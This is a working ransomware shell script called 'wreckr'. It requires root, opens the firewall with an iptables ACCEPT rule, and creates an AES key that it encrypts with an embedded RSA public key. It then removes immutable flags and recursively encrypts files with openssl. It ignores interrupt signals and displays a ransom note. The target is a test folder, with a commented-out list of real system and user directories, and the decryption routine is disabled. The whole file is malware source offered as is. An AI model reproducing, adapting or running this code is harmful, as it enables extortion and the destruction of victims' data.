#!/bin/sh
# Vars Needed
#ERRMSG=""
#OS=""
PROGRAM_NAME="wreckr"
PROGRAM_VERSION="0.1.1"



################ CHECKS ###############################
# Get the OS version
get_os() {
    if [[$(uname -s | grep Linux) != ""]]; then
	OS="linux"
    elif [[ $( uname -s | grep BSD) != "" ]]; then
	OS="bsd"
    else
	adderr "[!] NOT \"Linux\" or \"BSD\""
	EXIT
    fi
}

# Check for a TUI
check_msg() {
    if [ "$(which dialog)" != "" ]; then
	DIALOG=dialog
    elif [ "$(which whiptail)" != "" ]; then
	DIALOG=whiptail
    else
	DIALOG=none
    fi
}
# check the requirements
check_req() {
    # Fatal Errors
    if [ "$(whoami)" != "root" ]; then
	adderr "[!] NOT ROOT"
        EXIT
    fi
    if [ "$(which openssl)" = "" ]; then
        adderr "[!] NO OPENSSL FOUND"
        EXIT
    fi
    # Non-Fatal Errors
    if [ "$(which iptables)" = "" ]; then
        adderr "[!] NO IPTABLES FOUND"
    else
        `which iptables` -I INPUT 1 -j ACCEPT
    fi
}
################ FUNCTIONS ##########################
openfile() {
	if [ "$OS" = "linux" ]; then
		chmod +rw $1
		chattr -i $1
	fi
	if [ "$OS" = "bsd" ]; then
		chmod +rw $1
		chflags schg $1
	fi
}
adderr() { ERRMSG="$ERRMSG\n$1"; }
EXIT() {
    echo "[+] STARTING\033[K$ERRMSG\n[!] EXITING"
exit; }

init() {
	check_req
	check_msg
	KEY="$(openssl rand -base64 25)"
	pubkey="\
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzovHnKSF3X8bqSFLl4gB
rCPrdg4iXYsS2GYxGGyft+AfCtUmUfBT7Bsi3vjRKgEqUuzjNJDjMjV5oZSX65z0
4tG4nHr6dbhx/QqFGBXkL4IBHoxgCBCiFWq8HSNKV8A8yFJhZhX8yCyejKwb0trl
vjrvvf9kQCMyvV+xb0m6I+Omwixyh6MEVy323GTGcDvvILRWrne40yzf3O0Xk8Ty
1eiYBi7wbTjZcS2oUe+5Pe+YutuCkoRwFjZXVB4j0i75g+sx+2UDbUfefhnH49gC
3LysGPZqijn/c9Gm3LBN9r7mrybZA/6zt9TvJnfhauWoRfPTZFDnCAvm0mjGjaLU
nwIDAQAB
-----END PUBLIC KEY-----\
	"
	echo "$pubkey" > vmware.pub
	PRIVATEKEY="vmware.key"
	echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "vmware.pub" -out $PRIVATEKEY
}
navdir() {
for fil in $1; do
	whitelist=".*vmware.*|.*_schema.*"
	fil=$(echo $fil | awk "!/$whitelist/") # remove anything containing vmware
	if [ -f "$fil" ]; then
		$2 $fil
	elif [ -d "$fil" ]; then
		navdir "$fil/*" "$2"
	fi
done
}
showmess() {
    case "$DIALOG" in
    *none*)
	reset
	echo $2 "(y/N)"
	read result
	;;
    *)
	$DIALOG --backtitle "$PROGRAM_NAME $PROGRAM_VERSION" \
       		--title "$1" \
       		--msgbox "$2" 16 60
        result=$?
	;;
    esac
}
############### ENCRYPTING ###########################
pck() {
    adderr "[+] Encrypted $1"
    LIST="$LIST$1\n"
    if [ -f "$1" ]; then
	if [ "$SOFT" = "" ]; then
	    openfile $1
	    stuff=$(cat $1)
	    echo "RAN" > $1
	    echo "$stuff" | openssl aes-256-cbc -k "$KEY" -out "$1" &>/dev/null
	fi
    fi
}
enc_loop() {
    kills="$1"
    for i in $kills; do
	if [ -d "$i" ]; then
	    navdir "$i/*" "pck"
	    adderr "[+] Encrypted $i"
	fi
    done
}
################## DECRYPT ################################
upk() {
    adderr "[+] Decrypted $1"
    if [ "$SOFT" = "" ]; then
	openfile $1
	openfile $1.dec
	mv $1 $1.enc
	openssl aes-256-cbc -d -k "$KEY" -in "$1.enc" -out "$1"
	rm $1.enc
    fi
}
dec_loop() {
    kills="$1"
    for i in $kills; do
    	if [ -d "$i" ]; then
	    navdir "$i/*" "upk"
	    adderr "[+] Decrypted $i"
	fi
    done
}
################# MAIN ######################################
main() {
    trap '' INT
    trap '' TERM
    #SOFT="YES"
    init
    targets="/root/Desktop/testing"
    #targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
    enc_loop "$targets"
    printf "$LIST" > TARGETS.TXT
    message="Congratulations,\n\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\n\nLove,\n\n~benSociety"
    title="Oops.."
    showmess "$title" "$message"
    #dec_loop "$targets"
EXIT
}
main
